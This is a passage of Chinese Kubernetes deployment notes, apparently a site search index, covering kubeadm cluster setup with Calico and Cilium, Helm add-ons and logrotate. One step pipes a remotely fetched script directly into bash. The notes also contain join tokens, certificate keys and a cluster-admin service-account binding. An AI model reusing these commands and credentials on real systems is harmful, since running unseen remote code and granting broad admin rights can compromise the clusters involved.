/var/lib/containerd\nls -l /var/lib/containerd\n\n# kubelet\nmkdir -p /data1/lib/kubelet &amp;&amp; \\\n    ([ -e /var/lib/kubelet ] &amp;&amp; mv /var/lib/kubelet{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/kubelet /var/lib/kubelet\nls -l /var/lib/kubelet   \n\n# etcd\uff08\u4ec5\u9700\u8981\u5728 control-plane\uff09\nmkdir -p /data1/lib/etcd &amp;&amp; \\\n    ([ -e /var/lib/etcd ] &amp;&amp; mv /var/lib/etcd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/etcd /var/lib/etcd\nls -l /var/lib/etcd\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#23","title":"2.3 \u5b89\u88c5\u5bb9\u5668\u8fd0\u884c\u65f6","text":"<pre><code>CONTAINERD_VERSION=1.5.9-0ubuntu1~20.04.4\napt install -y containerd=${CONTAINERD_VERSION}\n\napt-mark hold containerd\napt-mark showhold\ndpkg -l | grep containerd\n\n# \u66ff\u6362 ctr \u8fd0\u884c\u65f6\nmkdir -p /etc/containerd\ncontainerd config default &gt; /etc/containerd/config.toml-default\ncp /etc/containerd/config.toml-default /etc/containerd/config.toml\n\nsed -i 's#sandbox_image.*$#sandbox_image = \"hub.8ops.top/google_containers/pause:3.8\"#' /etc/containerd/config.toml  \nsed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml \ngrep -P 'sandbox_image|SystemdCgroup' /etc/containerd/config.toml  \nsystemctl restart containerd\nsystemctl status containerd\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#24-kube","title":"2.4 \u5b89\u88c5 kube \u73af\u5883","text":"<pre><code># kubeadm\nKUBERNETES_VERSION=1.25.0-00\napt install -y -q kubeadm=${KUBERNETES_VERSION} kubectl=${KUBERNETES_VERSION} kubelet=${KUBERNETES_VERSION}\n\napt-mark hold kubeadm kubectl kubelet\napt-mark showhold\ndpkg -l | grep kube\n\n# \u7528\u4e8e\u8fd0\u884c crictl\ncat &gt; /etc/crictl.yaml &lt;&lt;EOF\nruntime-endpoint: unix:///run/containerd/containerd.sock\nimage-endpoint: unix:///run/containerd/containerd.sock\ntimeout: 10\ndebug: false\nEOF\n\nsystemctl restart containerd\ncrictl images\ncrictl ps -a\n\n# \u521d\u59cb\u96c6\u7fa4\uff08\u4ec5\u9700\u8981\u5728\u5176\u4e2d\u4e00\u53f0 control-plane \u8282\u70b9\u64cd\u4f5c\uff09\n# config\nkubeadm config print init-defaults &gt; kubeadm-init.yaml-v1.25.0-default\n\nkubeadm config images list\nkubeadm config images list --config kubeadm-init.yaml-v1.25.0\nkubeadm config images pull --config kubeadm-init.yaml-v1.25.0\n\nkubeadm init --config kubeadm-init.yaml-v1.25.0 --upload-certs\n\nmkdir -p ~/.kube &amp;&amp; ln -s /etc/kubernetes/admin.conf ~/.kube/config \n\n# \u6dfb\u52a0\u8282\u70b9 control-plane\nkubeadm join 10.101.9.111:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:b214dc5d30387ad52c40bcd6ffa0e4bc29d15b488752af6a6ee66996914b8659 \\\n    --control-plane --certificate-key 629a5accb4cb5f839c004c07658d8fc275fb4145fc1fe44b2011249ac2fc4d83\n\n# \u6dfb\u52a0\u8282\u70b9 work-node\nkubeadm join 10.101.9.111:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:b214dc5d30387ad52c40bcd6ffa0e4bc29d15b488752af6a6ee66996914b8659    \n</code></pre> <p>\u7f16\u8f91 kubeadm-init.yaml-v1.25.0</p> <pre><code>apiVersion: kubeadm.k8s.io/v1beta3\nbootstrapTokens:\n- groups:\n  - system:bootstrappers:kubeadm:default-node-token\n  token: abcdef.0123456789abcdef\n  ttl: 24h0m0s\n  usages:\n  - signing\n  - authentication\nkind: InitConfiguration\nlocalAPIEndpoint:\n  advertiseAddress: 10.101.11.240\n  bindPort: 6443\nnodeRegistration:\n  criSocket: unix:///var/run/containerd/containerd.sock\n  imagePullPolicy: IfNotPresent\n  name: K-KUBE-LAB-01\n  taints: null\n---\napiServer:\n  timeoutForControlPlane: 4m0s\napiVersion: kubeadm.k8s.io/v1beta3\ncertificatesDir: /etc/kubernetes/pki\nclusterName: kubernetes\ncontrollerManager: {}\ndns:\n  imageRepository: hub.8ops.top/google_containers\n  imageTag: v1.9.3\netcd:\n  local:\n    dataDir: /var/lib/etcd\nimageRepository: hub.8ops.top/google_containers\nkind: ClusterConfiguration\nkubernetesVersion: 1.25.0\ncontrolPlaneEndpoint: 10.101.11.110:6443\nnetworking:\n  dnsDomain: cluster.local\n  podSubnet: 172.19.0.0/16\n  serviceSubnet: 192.168.0.0/16\nscheduler: {}\n---\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\ncgroupDriver: systemd\n---\napiVersion: kubeproxy.config.k8s.io/v1alpha1\nkind: KubeProxyConfiguration\nmode: ipvs\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#25","title":"2.5 \u4f18\u5316\u914d\u7f6e","text":"<p>optional</p> <pre><code># kubelet\nkubectl -n kube-system edit cm kubelet-config\n\u2026\u2026\n    # GC\n    imageGCLowThresholdPercent: 40\n    imageGCHighThresholdPercent: 50\n    # Resource\n    systemReserved:\n      cpu: 500m\n      memory: 500m\n    kubeReserved:\n      cpu: 500m\n      memory: 500m\n    evictionPressureTransitionPeriod: 300s # upgrade\n    nodeStatusReportFrequency: 10s         # upgrade\n    nodeStatusUpdateFrequency: 10s         # upgrade\n    cgroupDriver: systemd\n    maxPods: 200\n    resolvConf: /etc/resolv.conf\nkind: ConfigMap                            # relative\n\u2026\u2026\n\n# kube-proxy \n# \u5f53flannel\u91c7\u7528host-gw\u65f6\uff0c\u9700\u8981\u5f00\u542fipvs\nkubectl -n kube-system edit cm kube-proxy\n\n\u2026\u2026\n    configSyncPeriod: 5s # upgrade\n    mode: \"ipvs\"         # upgrade\n    ipvs:                # relative\n      tcpTimeout: 900s   # upgrade\n      syncPeriod: 5s     # upgrade\n      minSyncPeriod: 5s  # upgrade\n\u2026\u2026\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#calico","title":"\u4e09\u3001\u5e94\u7528 Calico","text":""},{"location":"kubernetes/01-cluster-init-calico/#31-helm","title":"3.1 Helm","text":"<p>Reference</p> <pre><code>helm repo add projectcalico https://projectcalico.docs.tigera.io/charts\nhelm repo update projectcalico\nhelm search repo tigera-operator\nhelm show values projectcalico/tigera-operator &gt; calico-tigera-operator.yaml-v3.24.1-default\n\nhelm install calico projectcalico/tigera-operator \\\n    -f calico-tigera-operator.yaml-v3.24.1 \\\n    -n kube-system \\\n    --create-namespace \\\n    --version v3.24.1\n\nhelm upgrade --install calico projectcalico/tigera-operator \\\n    -f calico-tigera-operator.yaml-v3.24.1 \\\n    -n kube-system \\\n    --create-namespace \\\n    --version v3.24.1\n</code></pre> <p>\u7f16\u8f91\u914d\u7f6e</p> <pre><code># vim calico-tigera-operator.yaml-v3.24.1\n\nresources:\n  limits:\n    cpu: 500m\n    memory: 512Mi\n  requests:\n    cpu: 50m\n    memory: 64Mi\n\ntigeraOperator:\n  image: google_containers/calico-tigera-operator\n  version: v1.28.1\n  registry: hub.8ops.top\ncalicoctl:\n  image: hub.8ops.top/google_containers/calico-ctl\n  tag: v3.24.1\n</code></pre> <p>\u9057\u7559\u95ee\u9898</p> <ol> <li>calico \u547d\u540d\u7a7a\u95f4 <code>calico-apiserver</code> &amp; <code>calico-system</code> \u4e0d\u80fd\u66ff\u6362</li> <li>calico \u4f9d\u8d56\u955c\u50cf <code>calico/cni</code> \u7b495\u4e2a\u65e0\u6cd5\u66ff\u6362\u6210\u5185\u90e8\u5730\u5740</li> </ol>"},{"location":"kubernetes/01-cluster-init-calico/#32","title":"3.2 \u539f\u751f","text":"<p>Reference</p> <pre><code># Example\n#   https://raw.githubusercontent.com/projectcalico/calico/v3.24.1/manifests/calico.yaml\n#   https://docs.projectcalico.org/manifests/calico.yaml # \u672a\u6210\u529f\n#   EDIT AFTER\n#   https://books.8ops.top/attachment/kubernetes/calico.yaml-v3.24.1\n# \nkubectl apply -f calico.yaml-v3.24.1\n</code></pre> <p>\u7f16\u8f91\u914d\u7f6e</p> <pre><code>\u2026\u2026\n            - name: CALICO_IPV4POOL_CIDR\n              value: \"172.19.0.0/16\"\n\u2026\u2026\n\n# \u955c\u50cf\u66ff\u6362\n          image: hub.8ops.top/google_containers/calico-cni:v3.24.1\n          image: hub.8ops.top/google_containers/calico-cni:v3.24.1\n          image: hub.8ops.top/google_containers/calico-node:v3.24.1\n          image: hub.8ops.top/google_containers/calico-node:v3.24.1\n          image: hub.8ops.top/google_containers/calico-kube-controllers:v3.24.1\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#addon","title":"\u56db\u3001Addon","text":""},{"location":"kubernetes/01-cluster-init-calico/#41-metallb","title":"4.1 MetalLB","text":"<p>Reference</p>"},{"location":"kubernetes/01-cluster-init-calico/#42-ingress-nginx","title":"4.2 Ingress-Nginx","text":"<p>\u91c7\u7528 Deployment \u8d44\u6e90\u7c7b\u578b\u90e8\u7f72\uff0c\u7ed3\u5408 LoadBalancer \u65b9\u5f0f\u66b4\u9732\u6d41\u91cf</p> <pre><code>helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx\nhelm repo update\nhelm search repo ingress-nginx\nhelm show values ingress-nginx/ingress-nginx &gt; ingress-nginx.yaml-v4.2.5-default\n\n# external\n# vim ingress-nginx-external.yaml-v4.2.5\n# e.g. https://books.8ops.top/attachment/kubernetes/helm/ingress-nginx-external.yaml-v4.2.5\n#\n\nhelm install ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-external.yaml-v4.2.5 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 4.2.5\n\nhelm upgrade --install ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-external.yaml-v4.2.5 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 4.2.5\n</code></pre> <p>\u5207\u5272\u65e5\u5fd7</p> <pre><code># /etc/logrotate.d/nginx\n/var/log/nginx/access.log\n {\n    su systemd-resolve nginx-ingress\n    hourly\n    rotate 180\n    dateext\n    missingok\n    notifempty\n    compress\n    delaycompress\n    nomail\n    sharedscripts\n    postrotate\n        for pid in `/bin/pidof nginx `;do\n            kill -USR1 ${pid}\n        done\n    endscript\n}\n/var/log/nginx/error.log\n {\n    su systemd-resolve nginx-ingress\n    daily\n    rotate 7\n    dateext\n    missingok\n    notifempty\n    compress\n    delaycompress\n    nomail\n    sharedscripts\n    postrotate\n        for pid in `/bin/pidof nginx `;do\n            kill -USR1 ${pid}\n        done\n    endscript\n}\n\n# \u786e\u4fdduid=101,gid=82\u7684\u7528\u6237\u548c\u7ec4\u5b58\u5728\ngroupadd -g 82 nginx-ingress\ncd /data1/log/nginx\n\nchown 101.82 * &amp;&amp; ls -l \n\nsystemctl start logrotate &amp;&amp; ls -l &amp;&amp; sleep 5 &amp;&amp; systemctl status logrotate\n\n# \u8c03\u6574\u5b9a\u65f6\u5668\u4e3a\u5c0f\u65f6\nsed -i 's/OnCalendar=daily/OnCalendar=hourly/' /lib/systemd/system/logrotate.timer\nsystemctl daemon-reload &amp;&amp; sleep 5 &amp;&amp; systemctl status logrotate.timer\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#43-dashboard","title":"4.3 Dashboard","text":"<pre><code>helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/\nhelm repo update\nhelm search repo kubernetes-dashboard\nhelm show values kubernetes-dashboard/kubernetes-dashboard &gt; kubernetes-dashboard.yaml-v5.10.0-default\n\n# vim kubernetes-dashboard.yaml-v5.10.0\n# e.g. https://books.8ops.top/attachment/kubernetes/helm/kubernetes-dashboard.yaml-v5.10.0\n# \n\nhelm install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml-v5.10.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 5.10.0\n\nhelm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml-v5.10.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 5.10.0\n\n#----\n# create sa for ops\nkubectl create serviceaccount dashboard-ops -n kube-server\n\n# binding clusterrole\nkubectl create clusterrolebinding dashboard-ops \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=kube-server:dashboard-ops\n\n# create token\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: dashboard-ops-secret\n  namespace: kube-server\n  annotations:\n    kubernetes.io/service-account.name: dashboard-ops\ntype: kubernetes.io/service-account-token\nEOF\n\n# output token\nkubectl -n kube-server describe secrets dashboard-ops-secret\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#_3","title":"\u4e94\u3001\u5e38\u89c1\u95ee\u9898","text":"<pre><code># 1, calico-node pod not ready\n# \u9700\u8981\u5f00\u542f firewall port\n\n# 2, first-found \u4f1a\u627e\u4e3b\u673a\u7684\u7b2c\u4e00\u5757\u7f51\u5361\uff0c\u4f46\u9884\u8bbe\u662f\u627e\"eth*\"\uff0c\u6240\u4ee5vm\u7684\u7f51\u5361\u4e3aens*\u4f1a\u5931\u8d25\uff0c\u9700\u8981\u5982\u4e0b\u64cd\u4f5c\n&gt;&gt; search\n- name: IP\n  value: \"autodetect\"\n&gt;&gt; add\n- name: IP_AUTODETECTION_METHOD\n  value: \"interface=ens192\"  (\u591a\u7f51\u5361\u7528\",\"\u5206\u9694)\n\n# 3, wget https://github.com/projectcalico/calico/releases/download/v3.28.2/calicoctl-linux-amd64 -o calicoctl\ncalicoctl -h\ncalicoctl version\ncalicoctl node status\n</code></pre>"},{"location":"kubernetes/01-cluster-init-calico/#51-calico-vs-flannel","title":"5.1 Calico vs Flannel","text":"\u5bf9\u6bd4\u9879 Calico Flannel Underlay BGP X Overlay vxlan / ipip vxlan Qos X X \u6548\u80fd\u8017\u635f Overlay 20%, Underlay 3% Overlay 20% \u5b89\u5168\u7b56\u7565 NetworkPolicy X \u56fa\u5b9aIP/Mac \u652f\u6301\u56fa\u5b9aIP X"},{"location":"kubernetes/01-cluster-init-cilium/","title":"Quick Start - Cilium","text":"<p>Reference</p> <p>\u5f53\u524d\u5404\u8f6f\u4ef6\u7248\u672c</p> \u540d\u79f0 \u7248\u672c ubuntu v22.04 kubernetes v1.25.3 cilium v0.12.2 hubble v0.10.0 containerd <ul> <li>\u8fd9\u91cc\u64cd\u4f5c\u7cfb\u7edf\u9009\u62e9 <code>20.04</code></li> </ul>"},{"location":"kubernetes/01-cluster-init-cilium/#_1","title":"\u4e00\u3001\u51c6\u5907\u8d44\u6e90","text":""},{"location":"kubernetes/01-cluster-init-cilium/#11-vip","title":"1.1 VIP","text":"<p>\u901a\u8fc7 <code>haproxy</code> \u4ee3\u7406 <code>apiserver</code> \u591a\u8282\u70b9</p> <p>10.101.11.110</p>"},{"location":"kubernetes/01-cluster-init-cilium/#12","title":"1.2 \u670d\u52a1\u5668","text":"\u89d2\u8272 \u670d\u52a1\u5668\u5730\u5740 control-plane 10.101.11.240 control-plane 10.101.11.114 control-plane 10.101.11.154 work-node 10.101.11.196 work-node 10.101.11.157 work-node 10.101.11.250"},{"location":"kubernetes/01-cluster-init-cilium/#_2","title":"\u4e8c\u3001\u642d\u5efa\u96c6\u7fa4","text":"<p>Reference</p> <p>pull repo </p> <pre><code>{\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.25.2\":\"hub.8ops.top/google_containers/kube-apiserver\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.25.2\":\"hub.8ops.top/google_containers/kube-controller-manager\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.25.2\":\"hub.8ops.top/google_containers/kube-scheduler\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.25.2\":\"hub.8ops.top/google_containers/kube-proxy\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.8\":\"hub.8ops.top/google_containers/pause\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.4-0\":\"hub.8ops.top/google_containers/etcd\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:v1.9.3\":\"hub.8ops.top/google_containers/coredns\"\n}\n</code></pre>"},{"location":"kubernetes/01-cluster-init-cilium/#21","title":"2.1 \u521d\u59cb\u5316\u73af\u5883","text":"<pre><code>curl -s https://books.8ops.top/attachment/kubernetes/bin/01-init.sh | bash\n</code></pre>"},{"location":"kubernetes/01-cluster-init-cilium/#22-lib","title":"2.2 \u8c03\u6574lib\u76ee\u5f55","text":"<pre><code># containerd\nmkdir -p /data1/lib/containerd &amp;&amp; \\\n    ([ -e /var/lib/containerd ] &amp;&amp; mv /var/lib/containerd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/containerd /var/lib/containerd\nls -l /var/lib/containerd\n\n# kubelet\nmkdir -p /data1/lib/kubelet &amp;&amp; \\\n    ([ -e /var/lib/kubelet ] &amp;&amp; mv /var/lib/kubelet{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/kubelet /var/lib/kubelet\nls -l /var/lib/kubelet   \n\n# etcd\uff08\u4ec5\u9700\u8981\u5728 control-plane\uff09\nmkdir -p /data1/lib/etcd &amp;&amp; \\\n    ([ -e /var/lib/etcd ] &amp;&amp; mv /var/lib/etcd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/etcd /var/lib/etcd\nls -l /var/lib/etcd\n</code></pre>"},{"location":"kubernetes/01-cluster-init-cilium/#23","title":"2.3 \u5b89\u88c5\u5bb9\u5668\u8fd0\u884c\u65f6","text":"<pre><code>CONTAINERD_VERSION=1.5.9-0ubuntu1~20.04.4\napt install -y containerd=${CONTAINERD_VERSION}\n\napt-mark hold containerd\napt-mark showhold\ndpkg -l | grep containerd\n\n# \u66ff\u6362 ctr \u8fd0\u884c\u65f6\nmkdir -p /etc/containerd\ncontainerd config default &gt; /etc/containerd/config.toml-default\ncp /etc/containerd/config.toml-default /etc/containerd/config.toml\n\nsed -i 's#sandbox_image.*$#sandbox_image = \"hub.8ops.top/google_containers/pause:3.6\"#' /etc/containerd/config.toml  \nsed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml \ngrep -P 'sandbox_image|SystemdCgroup' /etc/containerd/config.toml  \nsystemctl restart containerd\nsystemctl status containerd\n</code></pre>"},{"location":"kubernetes/01-cluster-init-cilium/#24-kube","title":"2.4 \u5b89\u88c5 kube \u73af\u5883","text":"<pre><code># kubeadm\nKUBERNETES_VERSION=1.25.0-00\napt install -y -q kubeadm=${KUBERNETES_VERSION} kubectl=${KUBERNETES_VERSION} kubelet=${KUBERNETES_VERSION}\napt-mark hold kubeadm kubectl kubelet\napt-mark showhold\ndpkg -l | grep kube\n\n# \u7528\u4e8e\u8fd0\u884c crictl\ncat &gt; /etc/crictl.yaml &lt;&lt;EOF\nruntime-endpoint: unix:///run/containerd/containerd.sock\nimage-endpoint: unix:///run/containerd/containerd.sock\ntimeout: 10\ndebug: false\nEOF\n\nsystemctl restart containerd\ncrictl images\ncrictl ps -a\n\n# config\nkubeadm config print init-defaults &gt; kubeadm-init.yaml-default\n\nkubeadm config images list -v 5\nkubeadm config images list --config kubeadm-init.yaml -v 5\nkubeadm config images pull --config kubeadm-init.yaml -v 5\n\n# \u521d\u59cb\u96c6\u7fa4\uff08\u4ec5\u9700\u8981\u5728\u5176\u4e2d\u4e00\u53f0 control-plane \u8282\u70b9\u64cd\u4f5c\uff09\nkubeadm init --config kubeadm-init.yaml --upload-certs -v 5\n\nmkdir -p ~/.kube &amp;&amp; ln -s /etc/kubernetes/admin.conf ~/.kube/config \n\n# \u6dfb\u52a0\u8282\u70b9 control-plane\nkubeadm join 10.101.9.111:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:2c6210399be45c5d2ecaf37eb37765400bc4f1588b958cf82c9a242e04c6409c \\\n    --control-plane --certificate-key 379790710e66c402b48abf3476c649f085273c8850e8c0cd31ddb4213373a273\n\n# \u6dfb\u52a0\u8282\u70b9 work-node\nkubeadm join 10.101.9.111:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:2c6210399be45c5d2ecaf37eb37765400bc4f1588b958cf82c9a242e04c6409c\n</code></pre> <p>\u7f16\u8f91 kubeadm-init.yaml</p> <pre><code>apiVersion: kubeadm.k8s.io/v1beta3\nbootstrapTokens:\n- groups:\n  - system:bootstrappers:kubeadm:default-node-token\n  token: abcdef.0123456789abcdef\n  ttl: 24h0m0s\n  usages:\n  - signing\n  - authentication\nkind: InitConfiguration\nlocalAPIEndpoint:\n  advertiseAddress: 10.101.9.183\n  bindPort: 6443\nnodeRegistration:\n  criSocket: unix:///var/run/containerd/containerd.sock\n  imagePullPolicy: IfNotPresent\n  name: K-LAB-K8S-MASTER-01\n  taints: null\n---\napiServer:\n  timeoutForControlPlane: 4m0s\napiVersion: kubeadm.k8s.io/v1beta3\ncertificatesDir: /etc/kubernetes/pki\nclusterName: kubernetes\ncontrollerManager: {}\ndns:\n  imageRepository: hub.8ops.top/google_containers\n  imageTag: v1.9.3\netcd:\n  local:\n    dataDir: /var/lib/etcd\nimageRepository: hub.8ops.top/google_containers\nkind: ClusterConfiguration\nkubernetesVersion: 1.25.0\ncontrolPlaneEndpoint: 10.101.9.111:6443\nnetworking:\n  dnsDomain: cluster.local\n  podSubnet: 172.20.0.0/16\n  serviceSubnet: 192.168.0.0/16\nscheduler: {}\n---\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\ncgroupDriver: systemd\n---\napiVersion: kubeproxy.config.k8s.io/v1alpha1\nkind: KubeProxyConfiguration\nmode: ipvs\n</code></pre>"},{"location":"kubernetes/01-cluster-init-cilium/#cilium","title":"\u4e09\u3001\u5e94\u7528 Cilium","text":"<p>Reference</p> <ul> <li>cilium</li> <li>hubble</li> <li>tingchen</li> </ul> <p>pull repo</p> <pre><code>{\n  \"quay.io/cilium/cilium:v1.12.1\":\"hub.8ops.top/google_containers/cilium\",\n  \"quay.io/cilium/certgen:v0.1.8\":\"hub.8ops.top/google_containers/certgen\",\n  \"quay.io/cilium/hubble-relay:v1.12.1\":\"hub.8ops.top/google_containers/hubble-relay\",\n  \"quay.io/cilium/hubble-ui-backend:v0.9.1\":\"hub.8ops.top/google_containers/hubble-ui-backend\",\n  \"quay.io/cilium/hubble-ui:v0.9.1\":\"hub.8ops.top/google_containers/hubble-ui\",\n  \"quay.io/cilium/operator:v1.12.1\":\"hub.8ops.top/google_containers/cilium-operator\",\n  \"quay.io/cilium/operator-generic:v1.12.1\":\"hub.8ops.top/google_containers/cilium-operator-generic\"\n}\n</code></pre>"},{"location":"kubernetes/01-cluster-init-cilium/#31","title":"3.1 \u5de5\u5177\u5b89\u88c5","text":"<pre><code># \u914d\u7f6e\u73af\u5883\nexport PATH=~/bin:$PATH\necho 'export PATH=~/bin:$PATH' &gt;&gt; ~/.bashrc\n\n# CILIUM\n# https://raw.githubusercontent.com/cilium/cilium-cli/master/stable.txt\nCILIUM_VERSION=v0.12.2\ncurl -sL --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_VERSION}/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\ntar xzvfC cilium-linux-amd64.tar.gz ~/bin\n\n# \u5b89\u88c5 cilium\uff0c\u7b49\u540c\u4e8e\n#    helm template --namespace kube-system cilium cilium/cilium --version 1.12.2 --set cluster.id=0,cluster.name=kubernetes,encryption.nodeEncryption=false,ipam.mode=cluster-pool,kubeProxyReplacement=disabled,operator.replicas=1,serviceAccounts.cilium.name=cilium,serviceAccounts.operator.name=cilium-operator\ncilium install\n\n# \u67e5\u770b cilium \u72b6\u6001\ncilium status\n\n# \u90e8\u7f72 hubble\ncilium hubble enable\n\n# HUBBLE\n# https://raw.githubusercontent.com/cilium/hubble/master/stable.txt\nHUBBLE_VERSION=v0.10.0\ncurl -sL --remote-name-all https://github.com/cilium/hubble/releases/download/${HUBBLE_VERSION}/hubble-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check hubble-linux-amd64.tar.gz.sha256sum\ntar xzvfC hubble-linux-amd64.tar.gz ~/bin\n\n# \u5f00\u542f hubble \u7684 api\n# \u540c\u65f6\u5f00\u542f\u8f6c\u53d1\uff0c\u7b49\u540c\u4e8e\n#    kubectl port-forward -n kube-system svc/hubble-relay --address 0.0.0.0 --address :: 4245:80\ncilium hubble port-forward &amp;\n\n# \u67e5\u770b hubble \u72b6\u6001\nhubble status\n\n# \u67e5\u770b\u6570\u636e\u8f6c\u53d1\u60c5\u51b5\nhubble observe\n\n# \u5f00\u542f hubble ui \u7ec4\u4ef6\uff0c\u7b49\u540c\u4e8e\n#    helm template --namespace kube-system cilium cilium/cilium --version 1.11.3 --set cluster.id=0,cluster.name=kubernetes,encryption.nodeEncryption=false,hubble.enabled=true,hubble.relay.enabled=true,hubble.tls.ca.cert=LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNGRENDQWJxZ0F3SUJBZ0lVSDRQcit1UU0xSXZtdWQvVlV3YWlycGllSEZBd0NnWUlLb1pJemowRUF3SXcKYURFTE1Ba0dBMVVFQmhNQ1ZWTXhGakFVQmdOVkJBZ1REVk5oYmlCR2NtRnVZMmx6WTI4eEN6QUpCZ05WQkFjVApBa05CTVE4d0RRWURWUVFLRXdaRGFXeHBkVzB4RHpBTkJnTlZCQXNUQmtOcGJHbDFiVEVTTUJBR0ExVUVBeE1KClEybHNhWFZ0SUVOQk1CNFhEVEl5TURVd09UQTVNREF3TUZvWERUSTNNRFV3T0RBNU1EQXdNRm93YURFTE1Ba0cKQTFVRUJoTUNWVk14RmpBVUJnTlZCQWdURFZOaGJpQkdjbUZ1WTJselkyOHhDekFKQmdOVkJBY1RBa05CTVE4dwpEUVlEVlFRS0V3WkRhV3hwZFcweER6QU5CZ05WQkFzVEJrTnBiR2wxYlRFU01CQUdBMVVFQXhNSlEybHNhWFZ0CklFTkJNRmt3RXdZSEtvWkl6ajBDQVFZSUtvWkl6ajBEQVFjRFFnQUU3Z21EQ05WOERseEIxS3VYYzhEdndCeUoKWUxuSENZNjVDWUhBb3ZBY3FUM3drcitLVVNwelcyVjN0QW9IaFdZV0UyQ2lUNjNIOXZLV1ZRY3pHeXp1T0tOQwpNRUF3RGdZRFZSMFBBUUgvQkFRREFnRUdNQThHQTFVZEV3RUIvd1FGTUFNQkFmOHdIUVlEVlIwT0JCWUVGQmMrClNDb3F1Y0JBc09sdDBWaEVCbkwyYjEyNE1Bb0dDQ3FHU000OUJBTUNBMGdBTUVVQ0lRRDJsNWVqaDVLVTkySysKSHJJUXIweUwrL05pZ3NSUHRBblA5T3lDcHExbFJBSWdYeGY5a2t5N2xYU0pOYmpkREFjbnBrNlJFTFp2eEkzbQpKaG9JRkRlbER0dz0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=,hubble.tls.ca.key=[--- REDACTED WHEN PRINTING TO TERMINAL (USE --redact-helm-certificate-keys=false TO PRINT) ---],hubble.ui.enabled=true,hubble.ui.securityContext.enabled=false,ipam.mode=cluster-pool,kubeProxyReplacement=disabled,operator.replicas=1,serviceAccounts.cilium.name=cilium,serviceAccounts.operator.name=cilium-operator\ncilium hubble enable --ui \n# \u82e5\u63d0\u793a service/hubble-peer \u5df2\u7ecf\u5b58\u5728\uff0c\u53ef\u624b\u52a8\u5220\u9664\u540e\u518d\u542f\u52a8 kubectl -n kube-system delete svc hubble-peer\n\n# \u5f00\u542f\u7aef\u53e3\u8f6c\u53d1\uff0c\u7b49\u540c\u4e8e\n#    kubectl port-forward -n kube-system svc/hubble-ui --address 0.0.0.0 --address :: 12000:80\ncilium hubble ui &amp;\n</code></pre> <p>Output</p> <pre><code>root@K-LAB-K8S-MASTER-01:~# cilium status\n    /\u00af\u00af\\\n /\u00af\u00af\\__/\u00af\u00af\\    Cilium:         OK\n \\__/\u00af\u00af\\__/    Operator:       OK\n /\u00af\u00af\\__/\u00af\u00af\\    Hubble:         OK\n \\__/\u00af\u00af\\__/    ClusterMesh:    disabled\n    \\__/\n\nDeployment        hubble-relay       Desired: 1, Ready: 1/1, Available: 1/1\nDeployment        cilium-operator    Desired: 1, Ready: 1/1, Available: 1/1\nDeployment        hubble-ui          Desired: 1, Ready: 1/1, Available: 1/1\nDaemonSet         cilium             Desired: 4, Ready: 4/4, Available: 4/4\nContainers:       cilium             Running: 4\n                  hubble-relay       Running: 1\n                  cilium-operator    Running: 1\n                  hubble-ui          Running: 1\nCluster Pods:     4/4 managed by Cilium\nImage versions    cilium             quay.io/cilium/cilium:v1.12.1@sha256:ea2db1ee21b88127b5c18a96ad155c25485d0815a667ef77c2b7c7f31cab601b: 4\n                  hubble-relay       quay.io/cilium/hubble-relay:v1.12.1@sha256:646582b22bf41ad29dd7739b12aae77455ee5757b9ee087f2d45d684afef5fa1: 1\n                  cilium-operator    quay.io/cilium/operator-generic:v1.12.1@sha256:93d5aaeda37d59e6c4325ff05030d7b48fabde6576478e3fdbfb9bb4a68ec4a1: 1\n                  hubble-ui          